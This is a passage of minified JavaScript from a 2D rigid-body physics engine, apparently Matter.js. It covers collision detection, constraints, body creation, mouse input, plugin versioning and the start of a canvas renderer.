p=t.parts[d];n.translate(p.vertices,t.velocity),d>0&&(p.position.x+=t.velocity.x,p.position.y+=t.velocity.y),0!==t.angularVelocity&&(n.rotate(p.vertices,t.angularVelocity,t.position),u.rotate(p.axes,t.angularVelocity),d>0&&s.rotateAbout(p.position,t.angularVelocity,t.position,p.position)),h.update(p.bounds,p.vertices,t.velocity)}},r.applyForce=function(t,e,i){t.force.x+=i.x,t.force.y+=i.y;var r=e.x-t.position.x,n=e.y-t.position.y;t.torque+=r*i.y-n*i.x},r._totalProperties=function(t){for(var e={mass:0,area:0,inertia:0,centre:{x:0,y:0}},i=1===t.parts.length?0:1;i<t.parts.length;i++){var r=t.parts[i],n=r.mass!==1/0?r.mass:1;e.mass+=n,e.area+=r.area,e.inertia+=r.inertia,e.centre=s.add(e.centre,s.mult(r.position,n))}return e.centre=s.div(e.centre,e.mass),e}}()},function(t,e,i){var r={};t.exports=r;var n=i(4);r._motionWakeThreshold=.18,r._motionSleepThreshold=.08,r._minBias=.9,r.update=function(t,e){for(var i=e*e*e,n=0;n<t.length;n++){var s=t[n],o=s.speed*s.speed+s.angularSpeed*s.angularSpeed;if(0===s.force.x&&0===s.force.y){var a=Math.min(s.motion,o),h=Math.max(s.motion,o);s.motion=r._minBias*a+(1-r._minBias)*h,s.sleepThreshold>0&&s.motion<r._motionSleepThreshold*i?(s.sleepCounter+=1,s.sleepCounter>=s.sleepThreshold&&r.set(s,!0)):s.sleepCounter>0&&(s.sleepCounter-=1)}else r.set(s,!1)}},r.afterCollisions=function(t,e){for(var i=e*e*e,n=0;n<t.length;n++){var s=t[n];if(s.isActive){var o=s.collision,a=o.bodyA.parent,h=o.bodyB.parent;if(!(a.isSleeping&&h.isSleeping||a.isStatic||h.isStatic)&&(a.isSleeping||h.isSleeping)){var u=a.isSleeping&&!a.isStatic?a:h,l=u===a?h:a;!u.isStatic&&l.motion>r._motionWakeThreshold*i&&r.set(u,!1)}}}},r.set=function(t,e){var i=t.isSleeping;e?(t.isSleeping=!0,t.sleepCounter=t.sleepThreshold,t.positionImpulse.x=0,t.positionImpulse.y=0,t.positionPrev.x=t.position.x,t.positionPrev.y=t.position.y,t.anglePrev=t.angle,t.speed=0,t.angularSpeed=0,t.motion=0,i||n.trigger(t,"sleepStart")):(t.isSleeping=!1,t.sleepCounter=0,i&&n.trigger(t,"sleepEnd"))}},function(t,e,i){var r={};t.exports=r;var n,s,o,a=i(3),h=i(9);n=[],s={overlap:0,axis:null},o={overlap:0,axis:null},r.create=function(t,e){return{pair:null,collided:!1,bodyA:t,bodyB:e,parentA:t.parent,parentB:e.parent,depth:0,normal:{x:0,y:0},tangent:{x:0,y:0},penetration:{x:0,y:0},supports:[]}},r.collides=function(t,e,i){if(r._overlapAxes(s,t.vertices,e.vertices,t.axes),s.overlap<=0)return null;if(r._overlapAxes(o,e.vertices,t.vertices,e.axes),o.overlap<=0)return null;var n,u,l=i&&i.table[h.id(t,e)];l?n=l.collision:((n=r.create(t,e)).collided=!0,n.bodyA=t.id<e.id?t:e,n.bodyB=t.id<e.id?e:t,n.parentA=n.bodyA.parent,n.parentB=n.bodyB.parent),t=n.bodyA,e=n.bodyB,u=s.overlap<o.overlap?s:o;var c=n.normal,d=n.supports,p=u.axis,f=p.x,g=p.y;f*(e.position.x-t.position.x)+g*(e.position.y-t.position.y)<0?(c.x=f,c.y=g):(c.x=-f,c.y=-g),n.tangent.x=-c.y,n.tangent.y=c.x,n.depth=u.overlap,n.penetration.x=c.x*n.depth,n.penetration.y=c.y*n.depth;var m=r._findSupports(t,e,c,1),v=0;if(a.contains(t.vertices,m[0])&&(d[v++]=m[0]),a.contains(t.vertices,m[1])&&(d[v++]=m[1]),v<2){var _=r._findSupports(e,t,c,-1);a.contains(e.vertices,_[0])&&(d[v++]=_[0]),v<2&&a.contains(e.vertices,_[1])&&(d[v++]=_[1])}return 0===v&&(d[v++]=m[0]),d.length=v,n},r._overlapAxes=function(t,e,i,r){var n,s,o,a,h,u,l=e.length,c=i.length,d=e[0].x,p=e[0].y,f=i[0].x,g=i[0].y,m=r.length,v=Number.MAX_VALUE,_=0;for(h=0;h<m;h++){var y=r[h],x=y.x,E=y.y,b=d*x+p*E,T=f*x+g*E,D=b,w=T;for(u=1;u<l;u+=1)(a=e[u].x*x+e[u].y*E)>D?D=a:a<b&&(b=a);for(u=1;u<c;u+=1)(a=i[u].x*x+i[u].y*E)>w?w=a:a<T&&(T=a);if((n=(s=D-T)<(o=w-b)?s:o)<v&&(v=n,_=h,n<=0))break}t.axis=r[_],t.overlap=v},r._projectToAxis=function(t,e,i){for(var r=e[0].x*i.x+e[0].y*i.y,n=r,s=1;s<e.length;s+=1){var o=e[s].x*i.x+e[s].y*i.y;o>n?n=o:o<r&&(r=o)}t.min=r,t.max=n},r._findSupports=function(t,e,i,r){var s,o,a,h,u,l=e.vertices,c=l.length,d=t.position.x,p=t.position.y,f=i.x*r,g=i.y*r,m=Number.MAX_VALUE;for(u=0;u<c;u+=1)(h=f*(d-(o=l[u]).x)+g*(p-o.y))<m&&(m=h,s=o);return m=f*(d-(a=l[(c+s.index-1)%c]).x)+g*(p-a.y),f*(d-(o=l[(s.index+1)%c]).x)+g*(p-o.y)<m?(n[0]=s,n[1]=o,n):(n[0]=s,n[1]=a,n)}},function(t,e,i){var r={};t.exports=r;var n=i(17);r.create=function(t,e){var i=t.bodyA,n=t.bodyB,s={id:r.id(i,n),bodyA:i,bodyB:n,collision:t,contacts:[],activeContacts:[],separation:0,isActive:!0,confirmedActive:!0,isSensor:i.isSensor||n.isSensor,timeCreated:e,timeUpdated:e,inverseMass:0,friction:0,frictionStatic:0,restitution:0,slop:0};return r.update(s,t,e),s},r.update=function(t,e,i){var r=t.contacts,s=e.supports,o=t.activeContacts,a=e.parentA,h=e.parentB,u=a.vertices.length;t.isActive=!0,t.timeUpdated=i,t.collision=e,t.separation=e.depth,t.inverseMass=a.inverseMass+h.inverseMass,t.friction=a.friction<h.friction?a.friction:h.friction,t.frictionStatic=a.frictionStatic>h.frictionStatic?a.frictionStatic:h.frictionStatic,t.restitution=a.restitution>h.restitution?a.restitution:h.restitution,t.slop=a.slop>h.slop?a.slop:h.slop,e.pair=t,o.length=0;for(var l=0;l<s.length;l++){var c=s[l],d=c.body===a?c.index:u+c.index,p=r[d];p?o.push(p):o.push(r[d]=n.create(c))}},r.setActive=function(t,e,i){e?(t.isActive=!0,t.timeUpdated=i):(t.isActive=!1,t.activeContacts.length=0)},r.id=function(t,e){return t.id<e.id?"A"+t.id+"B"+e.id:"A"+e.id+"B"+t.id}},function(t,e,i){var r={};t.exports=r;var n=i(3),s=i(2),o=i(7),a=i(1),h=i(11),u=i(0);r._warming=.4,r._torqueDampen=1,r._minLength=1e-6,r.create=function(t){var e=t;e.bodyA&&!e.pointA&&(e.pointA={x:0,y:0}),e.bodyB&&!e.pointB&&(e.pointB={x:0,y:0});var i=e.bodyA?s.add(e.bodyA.position,e.pointA):e.pointA,r=e.bodyB?s.add(e.bodyB.position,e.pointB):e.pointB,n=s.magnitude(s.sub(i,r));e.length=void 0!==e.length?e.length:n,e.id=e.id||u.nextId(),e.label=e.label||"Constraint",e.type="constraint",e.stiffness=e.stiffness||(e.length>0?1:.7),e.damping=e.damping||0,e.angularStiffness=e.angularStiffness||0,e.angleA=e.bodyA?e.bodyA.angle:e.angleA,e.angleB=e.bodyB?e.bodyB.angle:e.angleB,e.plugin={};var o={visible:!0,lineWidth:2,strokeStyle:"#ffffff",type:"line",anchors:!0};return 0===e.length&&e.stiffness>.1?(o.type="pin",o.anchors=!1):e.stiffness<.9&&(o.type="spring"),e.render=u.extend(o,e.render),e},r.preSolveAll=function(t){for(var e=0;e<t.length;e+=1){var i=t[e],r=i.constraintImpulse;i.isStatic||0===r.x&&0===r.y&&0===r.angle||(i.position.x+=r.x,i.position.y+=r.y,i.angle+=r.angle)}},r.solveAll=function(t,e){for(var i=0;i<t.length;i+=1){var n=t[i],s=!n.bodyA||n.bodyA&&n.bodyA.isStatic,o=!n.bodyB||n.bodyB&&n.bodyB.isStatic;(s||o)&&r.solve(t[i],e)}for(i=0;i<t.length;i+=1)s=!(n=t[i]).bodyA||n.bodyA&&n.bodyA.isStatic,o=!n.bodyB||n.bodyB&&n.bodyB.isStatic,s||o||r.solve(t[i],e)},r.solve=function(t,e){var i=t.bodyA,n=t.bodyB,o=t.pointA,a=t.pointB;if(i||n){i&&!i.isStatic&&(s.rotate(o,i.angle-t.angleA,o),t.angleA=i.angle),n&&!n.isStatic&&(s.rotate(a,n.angle-t.angleB,a),t.angleB=n.angle);var h=o,u=a;if(i&&(h=s.add(i.position,o)),n&&(u=s.add(n.position,a)),h&&u){var l=s.sub(h,u),c=s.magnitude(l);c<r._minLength&&(c=r._minLength);var d,p,f,g,m,v=(c-t.length)/c,_=t.stiffness<1?t.stiffness*e:t.stiffness,y=s.mult(l,v*_),x=(i?i.inverseMass:0)+(n?n.inverseMass:0),E=x+((i?i.inverseInertia:0)+(n?n.inverseInertia:0));if(t.damping){var b=s.create();f=s.div(l,c),m=s.sub(n&&s.sub(n.position,n.positionPrev)||b,i&&s.sub(i.position,i.positionPrev)||b),g=s.dot(f,m)}i&&!i.isStatic&&(p=i.inverseMass/x,i.constraintImpulse.x-=y.x*p,i.constraintImpulse.y-=y.y*p,i.position.x-=y.x*p,i.position.y-=y.y*p,t.damping&&(i.positionPrev.x-=t.damping*f.x*g*p,i.positionPrev.y-=t.damping*f.y*g*p),d=s.cross(o,y)/E*r._torqueDampen*i.inverseInertia*(1-t.angularStiffness),i.constraintImpulse.angle-=d,i.angle-=d),n&&!n.isStatic&&(p=n.inverseMass/x,n.constraintImpulse.x+=y.x*p,n.constraintImpulse.y+=y.y*p,n.position.x+=y.x*p,n.position.y+=y.y*p,t.damping&&(n.positionPrev.x+=t.damping*f.x*g*p,n.positionPrev.y+=t.damping*f.y*g*p),d=s.cross(a,y)/E*r._torqueDampen*n.inverseInertia*(1-t.angularStiffness),n.constraintImpulse.angle+=d,n.angle+=d)}}},r.postSolveAll=function(t){for(var e=0;e<t.length;e++){var i=t[e],u=i.constraintImpulse;if(!(i.isStatic||0===u.x&&0===u.y&&0===u.angle)){o.set(i,!1);for(var l=0;l<i.parts.length;l++){var c=i.parts[l];n.translate(c.vertices,u),l>0&&(c.position.x+=u.x,c.position.y+=u.y),0!==u.angle&&(n.rotate(c.vertices,u.angle,i.position),h.rotate(c.axes,u.angle),l>0&&s.rotateAbout(c.position,u.angle,i.position,c.position)),a.update(c.bounds,c.vertices,i.velocity)}u.angle*=r._warming,u.x*=r._warming,u.y*=r._warming}}},r.pointAWorld=function(t){return{x:(t.bodyA?t.bodyA.position.x:0)+t.pointA.x,y:(t.bodyA?t.bodyA.position.y:0)+t.pointA.y}},r.pointBWorld=function(t){return{x:(t.bodyB?t.bodyB.position.x:0)+t.pointB.x,y:(t.bodyB?t.bodyB.position.y:0)+t.pointB.y}}},function(t,e,i){var r={};t.exports=r;var n=i(2),s=i(0);r.fromVertices=function(t){for(var e={},i=0;i<t.length;i++){var r=(i+1)%t.length,o=n.normalise({x:t[r].y-t[i].y,y:t[i].x-t[r].x}),a=0===o.y?1/0:o.x/o.y;e[a=a.toFixed(3).toString()]=o}return s.values(e)},r.rotate=function(t,e){if(0!==e)for(var i=Math.cos(e),r=Math.sin(e),n=0;n<t.length;n++){var s,o=t[n];s=o.x*i-o.y*r,o.y=o.x*r+o.y*i,o.x=s}}},function(t,e,i){var r={};t.exports=r;var n=i(3),s=i(0),o=i(6),a=i(1),h=i(2);r.rectangle=function(t,e,i,r,a){a=a||{};var h={label:"Rectangle Body",position:{x:t,y:e},vertices:n.fromPath("L 0 0 L "+i+" 0 L "+i+" "+r+" L 0 "+r)};if(a.chamfer){var u=a.chamfer;h.vertices=n.chamfer(h.vertices,u.radius,u.quality,u.qualityMin,u.qualityMax),delete a.chamfer}return o.create(s.extend({},h,a))},r.trapezoid=function(t,e,i,r,a,h){h=h||{};var u,l=i*(a*=.5),c=l+(1-2*a)*i,d=c+l;u=a<.5?"L 0 0 L "+l+" "+-r+" L "+c+" "+-r+" L "+d+" 0":"L 0 0 L "+c+" "+-r+" L "+d+" 0";var p={label:"Trapezoid Body",position:{x:t,y:e},vertices:n.fromPath(u)};if(h.chamfer){var f=h.chamfer;p.vertices=n.chamfer(p.vertices,f.radius,f.quality,f.qualityMin,f.qualityMax),delete h.chamfer}return o.create(s.extend({},p,h))},r.circle=function(t,e,i,n,o){n=n||{};var a={label:"Circle Body",circleRadius:i};o=o||25;var h=Math.ceil(Math.max(10,Math.min(o,i)));return h%2==1&&(h+=1),r.polygon(t,e,h,i,s.extend({},a,n))},r.polygon=function(t,e,i,a,h){if(h=h||{},i<3)return r.circle(t,e,a,h);for(var u=2*Math.PI/i,l="",c=.5*u,d=0;d<i;d+=1){var p=c+d*u,f=Math.cos(p)*a,g=Math.sin(p)*a;l+="L "+f.toFixed(3)+" "+g.toFixed(3)+" "}var m={label:"Polygon Body",position:{x:t,y:e},vertices:n.fromPath(l)};if(h.chamfer){var v=h.chamfer;m.vertices=n.chamfer(m.vertices,v.radius,v.quality,v.qualityMin,v.qualityMax),delete h.chamfer}return o.create(s.extend({},m,h))},r.fromVertices=function(t,e,i,r,u,l,c,d){var p,f,g,m,v,_,y,x,E,b,T=s.getDecomp();for(p=Boolean(T&&T.quickDecomp),r=r||{},g=[],u=void 0!==u&&u,l=void 0!==l?l:.01,c=void 0!==c?c:10,d=void 0!==d?d:.01,s.isArray(i[0])||(i=[i]),E=0;E<i.length;E+=1)if(v=i[E],!(m=n.isConvex(v))&&!p&&s.warnOnce("Bodies.fromVertices: Install the 'poly-decomp' library and use Common.setDecomp or provide 'decomp' as a global to decompose concave vertices."),m||!p)v=m?n.clockwiseSort(v):n.hull(v),g.push({position:{x:t,y:e},vertices:v});else{var D=v.map((function(t){return[t.x,t.y]}));T.makeCCW(D),!1!==l&&T.removeCollinearPoints(D,l),!1!==d&&T.removeDuplicatePoints&&T.removeDuplicatePoints(D,d);var w=T.quickDecomp(D);for(_=0;_<w.length;_++){var S=w[_].map((function(t){return{x:t[0],y:t[1]}}));c>0&&n.area(S)<c||g.push({position:n.centre(S),vertices:S})}}for(_=0;_<g.length;_++)g[_]=o.create(s.extend(g[_],r));if(u)for(_=0;_<g.length;_++){var A=g[_];for(y=_+1;y<g.length;y++){var C=g[y];if(a.overlaps(A.bounds,C.bounds)){var I=A.vertices,R=C.vertices;for(x=0;x<A.vertices.length;x++)for(b=0;b<C.vertices.length;b++){var P=h.magnitudeSquared(h.sub(I[(x+1)%I.length],R[b])),O=h.magnitudeSquared(h.sub(I[x],R[(b+1)%R.length]));P<5&&O<5&&(I[x].isInternal=!0,R[b].isInternal=!0)}}}}return g.length>1?(f=o.create(s.extend({parts:g.slice(0)},r)),o.setPosition(f,{x:t,y:e}),f):g[0]}},function(t,e,i){var r={};t.exports=r;var n=i(0);r.create=function(t){var e={};return t||n.log("Mouse.create: element was undefined, defaulting to document.body","warn"),e.element=t||document.body,e.absolute={x:0,y:0},e.position={x:0,y:0},e.mousedownPosition={x:0,y:0},e.mouseupPosition={x:0,y:0},e.offset={x:0,y:0},e.scale={x:1,y:1},e.wheelDelta=0,e.button=-1,e.pixelRatio=parseInt(e.element.getAttribute("data-pixel-ratio"),10)||1,e.sourceEvents={mousemove:null,mousedown:null,mouseup:null,mousewheel:null},e.mousemove=function(t){var i=r._getRelativeMousePosition(t,e.element,e.pixelRatio);t.changedTouches&&(e.button=0,t.preventDefault()),e.absolute.x=i.x,e.absolute.y=i.y,e.position.x=e.absolute.x*e.scale.x+e.offset.x,e.position.y=e.absolute.y*e.scale.y+e.offset.y,e.sourceEvents.mousemove=t},e.mousedown=function(t){var i=r._getRelativeMousePosition(t,e.element,e.pixelRatio);t.changedTouches?(e.button=0,t.preventDefault()):e.button=t.button,e.absolute.x=i.x,e.absolute.y=i.y,e.position.x=e.absolute.x*e.scale.x+e.offset.x,e.position.y=e.absolute.y*e.scale.y+e.offset.y,e.mousedownPosition.x=e.position.x,e.mousedownPosition.y=e.position.y,e.sourceEvents.mousedown=t},e.mouseup=function(t){var i=r._getRelativeMousePosition(t,e.element,e.pixelRatio);t.changedTouches&&t.preventDefault(),e.button=-1,e.absolute.x=i.x,e.absolute.y=i.y,e.position.x=e.absolute.x*e.scale.x+e.offset.x,e.position.y=e.absolute.y*e.scale.y+e.offset.y,e.mouseupPosition.x=e.position.x,e.mouseupPosition.y=e.position.y,e.sourceEvents.mouseup=t},e.mousewheel=function(t){e.wheelDelta=Math.max(-1,Math.min(1,t.wheelDelta||-t.detail)),t.preventDefault()},r.setElement(e,e.element),e},r.setElement=function(t,e){t.element=e,e.addEventListener("mousemove",t.mousemove),e.addEventListener("mousedown",t.mousedown),e.addEventListener("mouseup",t.mouseup),e.addEventListener("mousewheel",t.mousewheel),e.addEventListener("DOMMouseScroll",t.mousewheel),e.addEventListener("touchmove",t.mousemove),e.addEventListener("touchstart",t.mousedown),e.addEventListener("touchend",t.mouseup)},r.clearSourceEvents=function(t){t.sourceEvents.mousemove=null,t.sourceEvents.mousedown=null,t.sourceEvents.mouseup=null,t.sourceEvents.mousewheel=null,t.wheelDelta=0},r.setOffset=function(t,e){t.offset.x=e.x,t.offset.y=e.y,t.position.x=t.absolute.x*t.scale.x+t.offset.x,t.position.y=t.absolute.y*t.scale.y+t.offset.y},r.setScale=function(t,e){t.scale.x=e.x,t.scale.y=e.y,t.position.x=t.absolute.x*t.scale.x+t.offset.x,t.position.y=t.absolute.y*t.scale.y+t.offset.y},r._getRelativeMousePosition=function(t,e,i){var r,n,s=e.getBoundingClientRect(),o=document.documentElement||document.body.parentNode||document.body,a=void 0!==window.pageXOffset?window.pageXOffset:o.scrollLeft,h=void 0!==window.pageYOffset?window.pageYOffset:o.scrollTop,u=t.changedTouches;return u?(r=u[0].pageX-s.left-a,n=u[0].pageY-s.top-h):(r=t.pageX-s.left-a,n=t.pageY-s.top-h),{x:r/(e.clientWidth/(e.width||e.clientWidth)*i),y:n/(e.clientHeight/(e.height||e.clientHeight)*i)}}},function(t,e,i){var r={};t.exports=r;var n=i(0),s=i(8);r.create=function(t){return n.extend({bodies:[],pairs:null},t)},r.setBodies=function(t,e){t.bodies=e.slice(0)},r.clear=function(t){t.bodies=[]},r.collisions=function(t){var e,i,n=[],o=t.pairs,a=t.bodies,h=a.length,u=r.canCollide,l=s.collides;for(a.sort(r._compareBoundsX),e=0;e<h;e++){var c=a[e],d=c.bounds,p=c.bounds.max.x,f=c.bounds.max.y,g=c.bounds.min.y,m=c.isStatic||c.isSleeping,v=c.parts.length,_=1===v;for(i=e+1;i<h;i++){var y=a[i];if((A=y.bounds).min.x>p)break;if(!(f<A.min.y||g>A.max.y)&&(!m||!y.isStatic&&!y.isSleeping)&&u(c.collisionFilter,y.collisionFilter)){var x=y.parts.length;if(_&&1===x)(w=l(c,y,o))&&n.push(w);else for(var E=x>1?1:0,b=v>1?1:0;b<v;b++)for(var T=c.parts[b],D=(d=T.bounds,E);D<x;D++){var w,S=y.parts[D],A=S.bounds;d.min.x>A.max.x||d.max.x<A.min.x||d.max.y<A.min.y||d.min.y>A.max.y||(w=l(T,S,o))&&n.push(w)}}}}return n},r.canCollide=function(t,e){return t.group===e.group&&0!==t.group?t.group>0:0!=(t.mask&e.category)&&0!=(e.mask&t.category)},r._compareBoundsX=function(t,e){return t.bounds.min.x-e.bounds.min.x}},function(t,e,i){var r={};t.exports=r;var n=i(0);r._registry={},r.register=function(t){if(r.isPlugin(t)||n.warn("Plugin.register:",r.toString(t),"does not implement all required fields."),t.name in r._registry){var e=r._registry[t.name],i=r.versionParse(t.version).number,s=r.versionParse(e.version).number;i>s?(n.warn("Plugin.register:",r.toString(e),"was upgraded to",r.toString(t)),r._registry[t.name]=t):i<s?n.warn("Plugin.register:",r.toString(e),"can not be downgraded to",r.toString(t)):t!==e&&n.warn("Plugin.register:",r.toString(t),"is already registered to different plugin object")}else r._registry[t.name]=t;return t},r.resolve=function(t){return r._registry[r.dependencyParse(t).name]},r.toString=function(t){return"string"==typeof t?t:(t.name||"anonymous")+"@"+(t.version||t.range||"0.0.0")},r.isPlugin=function(t){return t&&t.name&&t.version&&t.install},r.isUsed=function(t,e){return t.used.indexOf(e)>-1},r.isFor=function(t,e){var i=t.for&&r.dependencyParse(t.for);return!t.for||e.name===i.name&&r.versionSatisfies(e.version,i.range)},r.use=function(t,e){if(t.uses=(t.uses||[]).concat(e||[]),0!==t.uses.length){for(var i=r.dependencies(t),s=n.topologicalSort(i),o=[],a=0;a<s.length;a+=1)if(s[a]!==t.name){var h=r.resolve(s[a]);h?r.isUsed(t,h.name)||(r.isFor(h,t)||(n.warn("Plugin.use:",r.toString(h),"is for",h.for,"but installed on",r.toString(t)+"."),h._warned=!0),h.install?h.install(t):(n.warn("Plugin.use:",r.toString(h),"does not specify an install function."),h._warned=!0),h._warned?(o.push("🔶 "+r.toString(h)),delete h._warned):o.push("✅ "+r.toString(h)),t.used.push(h.name)):o.push("❌ "+s[a])}o.length>0&&n.info(o.join("  "))}else n.warn("Plugin.use:",r.toString(t),"does not specify any dependencies to install.")},r.dependencies=function(t,e){var i=r.dependencyParse(t),s=i.name;if(!(s in(e=e||{}))){t=r.resolve(t)||t,e[s]=n.map(t.uses||[],(function(e){r.isPlugin(e)&&r.register(e);var s=r.dependencyParse(e),o=r.resolve(e);return o&&!r.versionSatisfies(o.version,s.range)?(n.warn("Plugin.dependencies:",r.toString(o),"does not satisfy",r.toString(s),"used by",r.toString(i)+"."),o._warned=!0,t._warned=!0):o||(n.warn("Plugin.dependencies:",r.toString(e),"used by",r.toString(i),"could not be resolved."),t._warned=!0),s.name}));for(var o=0;o<e[s].length;o+=1)r.dependencies(e[s][o],e);return e}},r.dependencyParse=function(t){return n.isString(t)?(/^[\w-]+(@(\*|[\^~]?\d+\.\d+\.\d+(-[0-9A-Za-z-+]+)?))?$/.test(t)||n.warn("Plugin.dependencyParse:",t,"is not a valid dependency string."),{name:t.split("@")[0],range:t.split("@")[1]||"*"}):{name:t.name,range:t.range||t.version}},r.versionParse=function(t){var e=/^(\*)|(\^|~|>=|>)?\s*((\d+)\.(\d+)\.(\d+))(-[0-9A-Za-z-+]+)?$/;e.test(t)||n.warn("Plugin.versionParse:",t,"is not a valid version or range.");var i=e.exec(t),r=Number(i[4]),s=Number(i[5]),o=Number(i[6]);return{isRange:Boolean(i[1]||i[2]),version:i[3],range:t,operator:i[1]||i[2]||"",major:r,minor:s,patch:o,parts:[r,s,o],prerelease:i[7],number:1e8*r+1e4*s+o}},r.versionSatisfies=function(t,e){e=e||"*";var i=r.versionParse(e),n=r.versionParse(t);if(i.isRange){if("*"===i.operator||"*"===t)return!0;if(">"===i.operator)return n.number>i.number;if(">="===i.operator)return n.number>=i.number;if("~"===i.operator)return n.major===i.major&&n.minor===i.minor&&n.patch>=i.patch;if("^"===i.operator)return i.major>0?n.major===i.major&&n.number>=i.number:i.minor>0?n.minor===i.minor&&n.patch>=i.patch:n.patch===i.patch}return t===e||"*"===t}},function(t,e,i){var r={};t.exports=r;var n=i(0),s=i(5),o=i(1),a=i(4),h=i(2),u=i(13);!function(){var t,e;"undefined"!=typeof window&&(t=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.msRequestAnimationFrame||function(t){window.setTimeout((function(){t(n.now())}),1e3/60)},e=window.cancelAnimationFrame||window.mozCancelAnimationFrame||window.webkitCancelAnimationFrame||window.msCancelAnimationFrame),r._goodFps=30,r._goodDelta=1e3/60,r.create=function(t){var e={controller:r,engine:null,element:null,canvas:null,mouse:null,frameRequestId:null,timing:{historySize:60,delta:0,deltaHistory:[],lastTime:0,lastTimestamp:0,lastElapsed:0,timestampElapsed:0,timestampElapsedHistory:[],engineDeltaHistory:[],engineElapsedHistory:[],elapsedHistory:[]},options:{width:800,height:600,pixelRatio:1,background:"#14151f",wireframeBackground:"#14151f",hasBounds:!!t.bounds,enabled:!0,wireframes:!0,showSleeping:!0,showDebug:!1,showStats:!1,showPerformance:!1,showBounds:!1,showVelocity:!1,showCollisions:!1,showSeparations:!1,showAxes:!1,showPositions:!1,showAngleIndicator:!1,showIds:!1,showVertexNumbers:!1,showConvexHulls:!1,showInternalEdges:!1,showMousePosition:!1}},i=n.extend(e,t);return i.canvas&&(i.canvas.width=i.options.width||i.canvas.width,i.canvas.height=i.options.height||i.canvas.height),i.mouse=t.mouse,i.engine=t.engine,i.canvas=i.canvas||c(i.options.width,i.options.height),i.context=i.canvas.getContext("2d"),i.textures={},i.bounds=i.bounds||{min:{x:0,y:0},max:{x:i.canvas.width,y:i.canvas.height}},i.options.showBroadphase=!1,1!==i.options.pixelRatio&&r.setPixelRatio(i,i.options.pixelRatio),n.isElement(i.element)?i.element.appendChild(i.canvas):i.canvas.parentNode||n.log("Render.create: options.element was undefined, render.canvas was created but not appended","warn"),i},r.run=function(e){!function n(s){e.frameRequestId=t(n),i(e,s),r.world(e,s),(e.options.showStats||e.options.showDebug)&&r.stats(e,e.context,s),(e.options.showPerformance||e.options.showDebug)&&r.performance(e,e.context,s)}()},r.stop=function(t){e(t.frameRequestId)},r.setPixelRatio=function(t,e){var i=t.options,r=t.canvas;"auto"===e&&(e=d(r)),i.pixelRatio=e,r.setAttribute("data-pixel-ratio",e),r.width=i.width*e,r.height=i.height*e,r.style.width=i.width+"px",r.style.height=i.height+"px"},r.lookAt=function(t,e,i,r){r=void 0===r||r,e=n.isArray(e)?e:[e],i=i||{x:0,y:0};for(var s={min:{x:1/0,y:1/0},max:{x:-1/0,y:-1/0}},o=0;o<e.length;o+=1){var a=e[o],h=a.bounds?a.bounds.min:a.min||a.position||a,l=a.bounds?a.bounds.max:a.max||a.position||a;h&&l&&(h.x<s.min.x&&(s.min.x=h.x),l.x>s.max.x&&(s.max.x=l.x),h.y<s.min.y&&(s.min.y=h.y),l.y>s.max.y&&(s.max.y=l.y))}var c=s.max.x-s.min.x+2*i.x,d=s.max.y-s.min.y+2*i.y,p=t.canvas.height,f=t.canvas.width/p,g=c/d,m=1,v=1;g>f?v=g/f:m=f/g,t.options.hasBounds=!0,t.bounds.min.x=s.min.x,t.bounds.max.x=s.min.x+c*m,t.bounds.min.y=s.min.y,t.bounds.max.y=s.min.y+d*v,r&&(t.bounds.min.x+=.5*c-c*m*.5,t.bounds.max.x+=.5*c-c*m*.5,t.bounds.min.y+=.5*d-d*v*.5,t.bounds.max.y+=.5*d-d*v*.5),t.bounds.min.x-=i.x,t.bounds.max.x-=i.x,t.bounds.min.y-=i.y,t.bounds.max.y-=i.y,t.mouse&&(u.setScale(t.mouse,{x:(t.bounds.max.x-t.bounds.min.x)/t.canvas.width,y:(t.bounds.max.y-t.bounds.min.y)/t.canvas.height}),u.setOffset(t.mouse,t.bounds.min))},r.startViewTransform=function(t){var e=t.bounds.max.x-t.bounds.min.x,i=t.bounds.max.y-t.bounds.min.y,r=e/t.options.width,n=i/t.options.height;t.context.setTransform(t.options.pixelRatio/r,0,0,t.options.pixelRatio/n,0,0),t.context.translate(-t.bounds.min.x,-t.bounds.min.y)},r.endViewTransform=function(t){t.context.setTransform(t.options.pixelRatio,0,0,t.options.pixelRatio,0,0)},r.world=function(t,e){var i,l=n.now(),c=t.engine,d=c.world,p=t.canvas,g=t.context,m=t.options,v=t.timing,_=s.allBodies(d),y=s.allConstraints(d),x=m.wireframes?m.wireframeBackground:m.background,E=[],b=[],T={timestamp:c.timing.timestamp};if(a.trigger(t,"beforeRender",T),t.currentBackground!==x&&f(t,x),g.globalCompositeOperation="source-in",g.fillStyle="transparent",g.fillRect(0,0,p.width,p.height),g.globalCompositeOperation="source-over",m.hasBounds){for(i=0;i<_.length;i++){var D=_[i];o.overlaps(D.bounds,t.bounds)&&E.push(D)}for(i=0;i<y.length;i++){var w=y[i],S=w.bodyA,A=w.bodyB,C=w.pointA,I=w.pointB;S&&(C=h.add(S.position,w.pointA)),A&&(I=h.add(A.position,w.pointB)),C&&I&&(o.contains(t.bounds,C)||o.contains(t.bounds,I))&&b.push(w)}r.startViewTransform(t),t.mouse&&(u.setScale(t.mouse,{x:(t.bounds.max.x-t.bounds.min.x)/t.options.width,y:(t.bounds.max.y-t.bounds.min.y)/t.options.height}),u.setOffset(t.mouse,t.bounds.min))}else b=y,E=_,1!==t.options.pixelRatio&&t.context.setTransform(t.options.pixelRatio,0,0,t.options.pixelRatio,0,0);!m.wireframes||c.enableSleeping&&m.showSleeping?r.bodies(t,E,g):(m.showConvexHulls&&r.bodyConvexHulls(t,E,g),r.bodyWireframes(t,E,g)),m.showBounds&&r.bodyBounds(t,E,g),(m.showAxes||m.showAngleIndicator)&&r.bodyAxes(t,E,g),m.showPositions&&r.bodyPositions(t,E,g),m.showVelocity&&r.bodyVelocity(t,E,g),m.showIds&&r.bodyIds(t,E,g),m.showSeparations&&r.separations(t,c.pairs.list,g),m.showCollisions&&r.collisions(t,c.pairs.list,g),m.showVertexNumbers&&r.vertexNumbers(t,E,g),m.showMousePosition&&r.mousePosition(t,t.mouse,g),r.constraints(b,g),m.hasBounds&&r.endViewTransform(t),a.trigger(t,"afterRender",T),v.lastElapsed=n.now()-l},r.stats=function(t,e,i){for(var r=t.engine,n=r.world,o=s.allBodies(n),a=0,h=0,u=0;u<o.length;u+=1)a+=o[u].parts.length;var l={Part:a,Body:o.length,Cons:s.allConstraints(n).length,Comp:s.allComposites(n).length,Pair:r.pairs.list.length};for(var c in e.fillStyle="#0e0f19",e.fillRect(h,0,302.5,44),e.font="12px Arial",e.textBaseline="top",e.textAlign="right",l){var 